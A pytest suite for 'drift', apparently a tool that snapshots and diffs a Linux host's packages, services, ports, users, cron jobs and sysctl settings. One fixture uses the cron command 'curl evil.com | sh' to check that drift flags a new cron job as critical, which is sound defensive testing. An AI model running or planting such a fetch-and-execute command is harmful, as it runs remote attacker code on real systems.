"""
tests/test_drift.py — comprehensive test suite for drift

Tests cover:
  - Models (Snapshot, Commit, Change serialisation)
  - Collectors (with mocked subprocess output)
  - Storage (save/load/commit/log/blame)
  - Diff engine (all categories, edge cases)
  - CLI commands (snapshot, log, diff, blame, show, search)
"""
from __future__ import annotations
import gzip
import json
import os
import sys
import tempfile
from pathlib import Path
from unittest.mock import patch, MagicMock

import pytest

# Make drift importable
sys.path.insert(0, str(Path(__file__).parent.parent))

from drift.models import (
    Snapshot, Commit, Change, DiffResult,
    Package, Service, Port, User, Group,
    CronJob, SysctlParam, Mount, EnvVar, KernelModule,
)


# ── fixtures ──────────────────────────────────────────────────────────────────

@pytest.fixture(autouse=True)
def tmp_store(tmp_path, monkeypatch):
    """Redirect drift storage to a temp dir for every test."""
    monkeypatch.setenv("DRIFT_DIR", str(tmp_path / "drift"))
    # Reload storage module so it picks up new env var
    import importlib
    import drift.storage as st
    importlib.reload(st)
    yield tmp_path / "drift"


def _make_snapshot(**kwargs) -> Snapshot:
    s = Snapshot.new()
    for k, v in kwargs.items():
        setattr(s, k, v)
    return s


def _make_package(name="nginx", version="1.24", manager="dpkg") -> Package:
    return Package(name=name, version=version, manager=manager)


def _make_service(name="nginx", state="active", enabled=True) -> Service:
    return Service(name=name, state=state, enabled=enabled)


def _make_port(port=80, protocol="tcp", process="nginx") -> Port:
    return Port(port=port, protocol=protocol, process=process)


def _make_user(name="alice", uid=1001, gid=1001,
               shell="/bin/bash", home="/home/alice") -> User:
    return User(name=name, uid=uid, gid=gid, shell=shell, home=home)


# ══════════════════════════════════════════════════════════════════════════════
# MODELS
# ══════════════════════════════════════════════════════════════════════════════

class TestModels:

    def test_snapshot_new_has_timestamp(self):
        s = Snapshot.new()
        assert s.timestamp
        assert "T" in s.timestamp  # ISO format

    def test_snapshot_new_has_hostname(self):
        s = Snapshot.new()
        assert s.hostname

    def test_snapshot_round_trip(self):
        s = _make_snapshot(
            packages=[_make_package()],
            services=[_make_service()],
            ports=[_make_port()],
            users=[_make_user()],
        )
        d    = s.to_dict()
        s2   = Snapshot.from_dict(d)
        assert s2.packages[0].name    == "nginx"
        assert s2.services[0].state   == "active"
        assert s2.ports[0].port       == 80
        assert s2.users[0].name       == "alice"

    def test_snapshot_digest_is_deterministic(self):
        s = _make_snapshot(packages=[_make_package()])
        assert s.digest() == s.digest()

    def test_snapshot_digest_changes_with_content(self):
        s1 = _make_snapshot(packages=[_make_package(version="1.0")])
        s2 = _make_snapshot(packages=[_make_package(version="2.0")])
        assert s1.digest() != s2.digest()

    def test_snapshot_digest_is_64_chars(self):
        s = Snapshot.new()
        assert len(s.digest()) == 64

    def test_commit_round_trip(self):
        c = Commit(
            hash="abc123def456",
            full_hash="a" * 64,
            timestamp="2026-01-01T00:00:00+00:00",
            hostname="myserver",
            message="+1 package",
            change_count=1,
            author="alice",
            trigger="manual",
            parent=None,
        )
        d  = c.to_dict()
        c2 = Commit.from_dict(d)
        assert c2.hash         == "abc123def456"
        assert c2.change_count == 1
        assert c2.parent       is None

    def test_change_to_dict(self):
        ch = Change(category="package", kind="added", name="nginx",
                    before=None, after="1.24", critical=False)
        d  = ch.to_dict()
        assert d["name"]     == "nginx"
        assert d["category"] == "package"
        assert d["kind"]     == "added"

    def test_diff_result_by_category(self):
        changes = [
            Change("package", "added",   "nginx",  None,    "1.24", False),
            Change("package", "removed", "apache", "2.4",   None,   False),
            Change("service", "modified","nginx",  "inactive","active", True),
        ]
        dr = DiffResult("aaa", "bbb", "2026-01-01T00:00:00", "2026-01-02T00:00:00",
                        "host", changes)
        assert len(dr.by_category["package"]) == 2
        assert len(dr.by_category["service"]) == 1

    def test_diff_result_summary(self):
        changes = [
            Change("package", "added",   "nginx",  None,  "1.24", False),
            Change("service", "removed", "apache", "2.4", None,   False),
        ]
        dr = DiffResult("a", "b", "", "", "h", changes)
        s  = dr.summary
        assert "package" in s or "service" in s


# ══════════════════════════════════════════════════════════════════════════════
# STORAGE
# ══════════════════════════════════════════════════════════════════════════════

class TestStorage:

    def test_save_and_load_snapshot(self):
        from drift.storage import save_snapshot, load_snapshot
        s = _make_snapshot(packages=[_make_package()])
        h = save_snapshot(s)
        assert len(h) == 64

        s2 = load_snapshot(h)
        assert s2 is not None
        assert s2.packages[0].name == "nginx"

    def test_save_is_idempotent(self):
        from drift.storage import save_snapshot
        s  = _make_snapshot()
        h1 = save_snapshot(s)
        h2 = save_snapshot(s)   # second save should not error
        assert h1 == h2

    def test_load_by_prefix(self):
        from drift.storage import save_snapshot, load_snapshot
        s = _make_snapshot()
        h = save_snapshot(s)
        # Load by 8-char prefix
        s2 = load_snapshot(h[:8])
        assert s2 is not None

    def test_load_nonexistent_returns_none(self):
        from drift.storage import load_snapshot
        assert load_snapshot("deadbeef1234") is None

    def test_commit_snapshot_creates_log_entry(self):
        from drift.storage import commit_snapshot, read_log
        s      = _make_snapshot()
        commit = commit_snapshot(s, trigger="test", author="alice")
        assert commit.hash
        assert commit.trigger == "test"
        assert commit.author  == "alice"
        log = read_log()
        assert len(log) >= 1
        assert log[0].hash == commit.hash

    def test_commit_snapshot_no_duplicate_for_unchanged(self):
        from drift.storage import commit_snapshot, read_log
        s1 = _make_snapshot(packages=[_make_package()])
        commit_snapshot(s1, trigger="test")

        # Second snapshot with identical content → no new commit
        s2 = _make_snapshot(packages=[_make_package()])
        s2.timestamp = s1.timestamp  # same timestamp to ensure same hash
        commit_snapshot(s2, trigger="test")

        log = read_log()
        assert len(log) == 1   # still only one commit

    def test_head_commit(self):
        from drift.storage import commit_snapshot, head_commit
        s      = _make_snapshot()
        commit = commit_snapshot(s)
        head   = head_commit()
        assert head is not None
        assert head.hash == commit.hash

    def test_read_log_newest_first(self):
        from drift.storage import commit_snapshot, read_log
        import time
        s1 = Snapshot.new(); s1.packages = [_make_package("nginx")]
        s2 = Snapshot.new(); s2.packages = [_make_package("nginx"), _make_package("postgresql")]
        time.sleep(0.01)   # ensure different timestamps
        s2.timestamp = Snapshot.new().timestamp
        c1 = commit_snapshot(s1)
        c2 = commit_snapshot(s2)
        log = read_log()
        # Newest first
        assert log[0].hash == c2.hash
        assert log[1].hash == c1.hash

    def test_read_log_limit(self):
        from drift.storage import commit_snapshot, read_log
        import time
        prev = None
        for i in range(5):
            s = Snapshot.new()
            s.packages = [_make_package(f"pkg{i}")]
            if i > 0:
                time.sleep(0.01)
                s.timestamp = Snapshot.new().timestamp
            commit_snapshot(s)
        log = read_log(n=3)
        assert len(log) == 3

    def test_store_stats(self):
        from drift.storage import save_snapshot, commit_snapshot, store_stats
        s = _make_snapshot()
        commit_snapshot(s)
        stats = store_stats()
        assert stats["total_commits"] >= 1
        assert stats["total_objects"] >= 1
        assert "disk_usage_mb" in stats

    def test_get_commit_by_prefix(self):
        from drift.storage import commit_snapshot, get_commit
        s      = _make_snapshot()
        commit = commit_snapshot(s)
        found  = get_commit(commit.hash[:6])
        assert found is not None
        assert found.hash == commit.hash


# ══════════════════════════════════════════════════════════════════════════════
# DIFF ENGINE
# ══════════════════════════════════════════════════════════════════════════════

class TestDiff:

    def test_no_changes_when_identical(self):
        from drift.diff import diff_snapshots
        s = _make_snapshot(packages=[_make_package()])
        r = diff_snapshots(s, s)
        assert len(r.changes) == 0

    def test_package_added(self):
        from drift.diff import diff_snapshots
        s1 = _make_snapshot()
        s2 = _make_snapshot(packages=[_make_package("nginx")])
        r  = diff_snapshots(s1, s2)
        added = [c for c in r.changes if c.kind == "added" and c.category == "package"]
        assert len(added) == 1
        assert added[0].name == "nginx (dpkg)"

    def test_package_removed(self):
        from drift.diff import diff_snapshots
        s1 = _make_snapshot(packages=[_make_package("nginx")])
        s2 = _make_snapshot()
        r  = diff_snapshots(s1, s2)
        removed = [c for c in r.changes if c.kind == "removed" and c.category == "package"]
        assert len(removed) == 1

    def test_package_version_upgraded(self):
        from drift.diff import diff_snapshots
        s1 = _make_snapshot(packages=[_make_package("nginx", "1.20")])
        s2 = _make_snapshot(packages=[_make_package("nginx", "1.24")])
        r  = diff_snapshots(s1, s2)
        modified = [c for c in r.changes if c.kind == "modified"]
        assert len(modified) == 1
        assert "1.20" in str(modified[0].before)
        assert "1.24" in str(modified[0].after)

    def test_service_state_change(self):
        from drift.diff import diff_snapshots
        s1 = _make_snapshot(services=[_make_service("nginx", "inactive")])
        s2 = _make_snapshot(services=[_make_service("nginx", "active")])
        r  = diff_snapshots(s1, s2)
        modified = [c for c in r.changes if c.category == "service"]
        assert len(modified) == 1
        assert modified[0].kind == "modified"

    def test_new_service_is_critical(self):
        from drift.diff import diff_snapshots
        s1 = _make_snapshot()
        s2 = _make_snapshot(services=[_make_service("mysterious-daemon")])
        r  = diff_snapshots(s1, s2)
        added = [c for c in r.changes if c.kind == "added" and c.category == "service"]
        assert any(c.critical for c in added)

    def test_new_port_is_critical(self):
        from drift.diff import diff_snapshots
        s1 = _make_snapshot()
        s2 = _make_snapshot(ports=[_make_port(4444, "tcp", "mystery")])
        r  = diff_snapshots(s1, s2)
        added = [c for c in r.changes if c.kind == "added" and c.category == "port"]
        assert any(c.critical for c in added)

    def test_new_user_is_critical(self):
        from drift.diff import diff_snapshots
        s1 = _make_snapshot()
        s2 = _make_snapshot(users=[_make_user("hacker")])
        r  = diff_snapshots(s1, s2)
        added = [c for c in r.changes if c.kind == "added" and c.category == "user"]
        assert any(c.critical for c in added)

    def test_new_cron_is_critical(self):
        from drift.diff import diff_snapshots
        s1 = _make_snapshot()
        s2 = _make_snapshot(cron_jobs=[
            CronJob(owner="root", schedule="* * * * *",
                    command="curl evil.com | sh", source="crontab")
        ])
        r  = diff_snapshots(s1, s2)
        added = [c for c in r.changes if c.kind == "added" and c.category == "cron"]
        assert any(c.critical for c in added)

    def test_critical_sysctl_flagged(self):
        from drift.diff import diff_snapshots
        s1 = _make_snapshot(sysctl=[SysctlParam("net.ipv4.ip_forward", "0")])
        s2 = _make_snapshot(sysctl=[SysctlParam("net.ipv4.ip_forward", "1")])
        r  = diff_snapshots(s1, s2)
        modified = [c for c in r.changes if c.category == "sysctl"]
        assert len(modified) == 1
        assert modified[0].critical is True

    def test_non_critical_sysctl_not_flagged(self):
        from drift.diff import diff_snapshots
        s1 = _make_snapshot(sysctl=[SysctlParam("vm.swappiness", "60")])
        s2 = _make_snapshot(sysctl=[SysctlParam("vm.swappiness", "10")])
        r  = diff_snapshots(s1, s2)
        modified = [c for c in r.changes if c.category == "sysctl"]
        assert len(modified) == 1
        assert modified[0].critical is False

    def test_multiple_categories_detected(self):
        from drift.diff import diff_snapshots
        s1 = _make_snapshot(
            packages=[_make_package("nginx")],
            services=[_make_service("nginx", "active")],
        )
        s2 = _make_snapshot(
            packages=[_make_package("nginx"), _make_package("postgresql")],
            services=[_make_service("nginx", "active"), _make_service("postgresql", "active")],
        )
        r = diff_snapshots(s1, s2)
        cats = {c.category for c in r.changes}
        assert "package" in cats
        assert "service" in cats

    def test_diff_result_summary_format(self):
        from drift.diff import diff_snapshots
        s1 = _make_snapshot()
        s2 = _make_snapshot(
            packages=[_make_package()],
            users=[_make_user()],
        )
        r = diff_snapshots(s1, s2)
        assert r.summary != "no changes"
        assert "package" in r.summary or "user" in r.summary

    def test_diff_to_text(self):
        from drift.diff import diff_snapshots, diff_to_text
        s1 = _make_snapshot()
        s2 = _make_snapshot(packages=[_make_package("nginx")])
        r  = diff_snapshots(s1, s2)
        text = diff_to_text(r)
        assert "nginx" in text
        assert "+" in text

    def test_diff_to_text_no_changes(self):
        from drift.diff import diff_snapshots, diff_to_text
        s = _make_snapshot()
        r = diff_snapshots(s, s)
        assert "No changes" in diff_to_text(r)

    def test_before_after_hashes_in_result(self):
        from drift.diff import diff_snapshots
        s1 = _make_snapshot()
        s2 = _make_snapshot(packages=[_make_package()])
        r  = diff_snapshots(s1, s2)
        assert r.before_hash
        assert r.after_hash
        assert r.before_hash != r.after_hash


# ══════════════════════════════════════════════════════════════════════════════
# COLLECTORS (mocked — no real system access)
# ══════════════════════════════════════════════════════════════════════════════

class TestCollectors:

    def test_collect_packages_dpkg(self):
        from drift.collectors import collect_packages
        dpkg_output = (
            "nginx\t1.24.0\tinstall ok installed\n"
            "curl\t7.88.0\tinstall ok installed\n"
            "wget\t1.21.0\tdeinstall ok config-files\n"  # should be excluded
        )
        with patch("drift.collectors._available", return_value=False) as mock_av, \
             patch("drift.collectors._run") as mock_run:
            mock_av.side_effect = lambda b: b == "dpkg-query"
            mock_run.return_value = dpkg_output
            pkgs, errs = collect_packages()
        assert len(pkgs) == 2
        names = {p.name for p in pkgs}
        assert "nginx" in names
        assert "curl" in names
        assert "wget" not in names

    def test_collect_users_from_passwd(self, tmp_path, monkeypatch):
        from drift.collectors import collect_users
        passwd = (
            "root:x:0:0:root:/root:/bin/bash\n"
            "alice:x:1001:1001::/home/alice:/bin/bash\n"
        )
        passwd_file = tmp_path / "passwd"
        passwd_file.write_text(passwd)
        import builtins
        real_open = builtins.open
        def mock_open(f, *a, **k):
            if str(f) == "/etc/passwd":
                return real_open(passwd_file, *a, **k)
            return real_open(f, *a, **k)
        monkeypatch.setattr("builtins.open", mock_open)
        with patch("drift.collectors._run", return_value=""):
            users, errs = collect_users()
        assert any(u.name == "root"  for u in users)
        assert any(u.name == "alice" for u in users)

    def test_collect_groups_from_etc_group(self, tmp_path, monkeypatch):
        from drift.collectors import collect_groups
        group_content = (
            "root:x:0:\n"
            "sudo:x:27:alice,bob\n"
            "docker:x:999:alice\n"
        )
        group_file = tmp_path / "group"
        group_file.write_text(group_content)
        import builtins
        real_open = builtins.open
        def mock_open(f, *a, **k):
            if str(f) == "/etc/group":
                return real_open(group_file, *a, **k)
            return real_open(f, *a, **k)
        monkeypatch.setattr("builtins.open", mock_open)
        groups, errs = collect_groups()
        sudo_group = next((g for g in groups if g.name == "sudo"), None)
        assert sudo_group is not None
        assert "alice" in sudo_group.members

    def test_collect_mounts_skips_virtual_fs(self, tmp_path):
        from drift.collectors import collect_mounts
        mounts_content = (
            "sysfs /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0\n"
            "proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0\n"
            "/dev/sda1 / ext4 rw,relatime 0 0\n"
            "/dev/sdb1 /data ext4 rw,relatime 0 0\n"
        )
        with patch("builtins.open", return_value=__import__("io").StringIO(mounts_content)):
            mounts, errs = collect_mounts()
        fstypes = {m.fstype for m in mounts}
        assert "sysfs" not in fstypes
        assert "proc"  not in fstypes
        assert "ext4"  in fstypes
        assert len(mounts) == 2

    def test_collect_sysctl(self):
        from drift.collectors import collect_sysctl
        sysctl_output = (
            "net.ipv4.ip_forward = 0\n"
            "vm.swappiness = 60\n"
            "kernel.randomize_va_space = 2\n"
        )
        with patch("drift.collectors._available", return_value=True), \
             patch("drift.collectors._run", return_value=sysctl_output):
            params, errs = collect_sysctl()
        keys = {p.key for p in params}
        assert "net.ipv4.ip_forward" in keys
        assert "vm.swappiness" in keys

    def test_collect_ss_ports(self):
        from drift.collectors import collect_ports
        ss_output = (
            "tcp   LISTEN  0  128  0.0.0.0:22      0.0.0.0:*  users:((\"sshd\",pid=1234,fd=3))\n"
            "tcp   LISTEN  0  128  0.0.0.0:80      0.0.0.0:*  users:((\"nginx\",pid=5678,fd=4))\n"
            "udp   UNCONN  0  0    0.0.0.0:53      0.0.0.0:*  users:((\"named\",pid=9012,fd=5))\n"
        )
        with patch("drift.collectors._available", side_effect=lambda b: b == "ss"), \
             patch("drift.collectors._run", return_value=ss_output):
            ports, errs = collect_ports()
        port_nums = {p.port for p in ports}
        assert 22 in port_nums
        assert 80 in port_nums
        processes = {p.process for p in ports}
        assert "sshd"  in processes
        assert "nginx" in processes

    def test_run_all_returns_snapshot(self):
        from drift.collectors import run_all
        with patch("drift.collectors.collect_packages",  return_value=([_make_package()], [])), \
             patch("drift.collectors.collect_services",  return_value=([_make_service()], [])), \
             patch("drift.collectors.collect_ports",     return_value=([_make_port()],    [])), \
             patch("drift.collectors.collect_users",     return_value=([_make_user()],    [])), \
             patch("drift.collectors.collect_groups",    return_value=([],                [])), \
             patch("drift.collectors.collect_cron",      return_value=([],                [])), \
             patch("drift.collectors.collect_sysctl",    return_value=([],                [])), \
             patch("drift.collectors.collect_mounts",    return_value=([],                [])), \
             patch("drift.collectors.collect_env",       return_value=([],                [])), \
             patch("drift.collectors.collect_kernel_modules", return_value=([], [])):
            snap = run_all()
        assert len(snap.packages) == 1
        assert len(snap.services) == 1
        assert len(snap.ports)    == 1
        assert len(snap.users)    == 1
        assert snap.duration_ms  >= 0

    def test_run_all_exclude(self):
        from drift.collectors import run_all
        with patch("drift.collectors.collect_packages",  return_value=([_make_package()], [])), \
             patch("drift.collectors.collect_services",  return_value=([_make_service()], [])), \
             patch("drift.collectors.collect_ports",     return_value=([],                [])), \
             patch("drift.collectors.collect_users",     return_value=([],                [])), \
             patch("drift.collectors.collect_groups",    return_value=([],                [])), \
             patch("drift.collectors.collect_cron",      return_value=([],                [])), \
             patch("drift.collectors.collect_sysctl",    return_value=([],                [])), \
             patch("drift.collectors.collect_mounts",    return_value=([],                [])), \
             patch("drift.collectors.collect_env",       return_value=([],                [])), \
             patch("drift.collectors.collect_kernel_modules", return_value=([], [])):
            snap = run_all(exclude={"packages"})
        # packages excluded → empty
        assert len(snap.packages) == 0
        # services not excluded → present
        assert len(snap.services) == 1

    def test_collector_exception_does_not_crash_run_all(self):
        from drift.collectors import run_all
        def broken():
            raise RuntimeError("disk exploded")

        with patch("drift.collectors.collect_packages", side_effect=broken), \
             patch("drift.collectors.collect_services",  return_value=([],[])), \
             patch("drift.collectors.collect_ports",     return_value=([],[])), \
             patch("drift.collectors.collect_users",     return_value=([],[])), \
             patch("drift.collectors.collect_groups",    return_value=([],[])), \
             patch("drift.collectors.collect_cron",      return_value=([],[])), \
             patch("drift.collectors.collect_sysctl",    return_value=([],[])), \
             patch("drift.collectors.collect_mounts",    return_value=([],[])), \
             patch("drift.collectors.collect_env",       return_value=([],[])), \
             patch("drift.collectors.collect_kernel_modules", return_value=([],[])):
            snap = run_all()
        # Should not raise — error captured in errors list
        assert any("crashed" in e.lower() for e in snap.errors)


# ══════════════════════════════════════════════════════════════════════════════
# CLI
# ══════════════════════════════════════════════════════════════════════════════

class TestCLI:

    def _mock_snapshot(self, **kwargs):
        """Return a mock Snapshot with sensible defaults."""
        s = _make_snapshot(
            packages=[_make_package("nginx"), _make_package("curl")],
            services=[_make_service("nginx")],
            ports=[_make_port(80)],
            users=[_make_user("alice")],
            **kwargs,
        )
        return s

    def _patch_collectors(self, snap=None):
        """Context manager that patches run_all to return a specific snapshot."""
        from unittest.mock import patch
        if snap is None:
            snap = self._mock_snapshot()
        return patch("drift.collectors.run_all", return_value=snap)

    def test_snapshot_command_returns_zero(self):
        from drift.cli import main
        snap = self._mock_snapshot()
        with self._patch_collectors(snap):
            rc = main(["snapshot"])
        assert rc == 0

    def test_snapshot_creates_commit(self):
        from drift.cli     import main
        from drift.storage import read_log
        snap = self._mock_snapshot()
        with self._patch_collectors(snap):
            main(["snapshot"])
        log = read_log()
        assert len(log) >= 1

    def test_log_command_returns_zero(self):
        from drift.cli import main
        snap = self._mock_snapshot()
        with self._patch_collectors(snap):
            main(["snapshot"])
        rc = main(["log"])
        assert rc == 0

    def test_log_empty_returns_zero(self):
        from drift.cli import main
        rc = main(["log"])
        assert rc == 0

    def test_diff_command_no_snapshots(self):
        from drift.cli import main
        rc = main(["diff"])
        assert rc == 1   # no commits → error

    def test_diff_command_with_snapshots(self):
        from drift.cli import main
        import time
        s1 = self._mock_snapshot()
        with self._patch_collectors(s1):
            main(["snapshot"])
        time.sleep(0.05)
        s2 = Snapshot.new()
        s2.packages  = [_make_package("nginx"), _make_package("postgresql")]
        s2.services  = [_make_service("nginx")]
        s2.ports     = [_make_port(80)]
        s2.users     = [_make_user("alice")]
        with self._patch_collectors(s2):
            main(["snapshot"])
        rc = main(["diff"])
        assert rc == 0

    def test_status_command(self):
        from drift.cli import main
        snap = self._mock_snapshot()
        with self._patch_collectors(snap):
            rc = main(["status"])
        assert rc == 0

    def test_stats_command(self):
        from drift.cli import main
        rc = main(["stats"])
        assert rc == 0

    def test_blame_no_commits(self):
        from drift.cli import main
        rc = main(["blame"])
        assert rc == 1

    def test_show_command(self):
        from drift.cli import main
        snap = self._mock_snapshot()
        with self._patch_collectors(snap):
            main(["snapshot"])
        from drift.storage import head_commit
        commit = head_commit()
        rc = main(["show", commit.hash])
        assert rc == 0

    def test_show_json_output(self, capsys):
        from drift.cli     import main
        from drift.storage import head_commit, load_snapshot
        snap = self._mock_snapshot()
        with self._patch_collectors(snap):
            main(["snapshot"])
        commit   = head_commit()
        # show --json should print raw JSON to stdout
        rc = main(["show", commit.hash, "--json"])
        assert rc == 0
        captured = capsys.readouterr()
        # Find valid JSON in output (may have other lines)
        for line in captured.out.splitlines():
            line = line.strip()
            if line.startswith("{"):
                data = json.loads(line + captured.out[captured.out.index(line) + len(line):])
                assert "packages" in data
                break
        else:
            # Full output is JSON
            data = json.loads(captured.out)
            assert "packages" in data

    def test_search_command(self):
        from drift.cli import main
        snap = self._mock_snapshot()
        with self._patch_collectors(snap):
            main(["snapshot"])
        rc = main(["search", "nginx"])
        assert rc == 0

    def test_unknown_command_returns_nonzero(self):
        from drift.cli import main
        with pytest.raises(SystemExit) as exc_info:
            main(["nonexistent-command"])
        assert exc_info.value.code != 0

    def test_daemon_status_not_running(self, capsys):
        from drift.cli import main
        with patch("drift.daemon.daemon_status", return_value={"running": False}):
            rc = main(["daemon", "status"])
        assert rc == 0
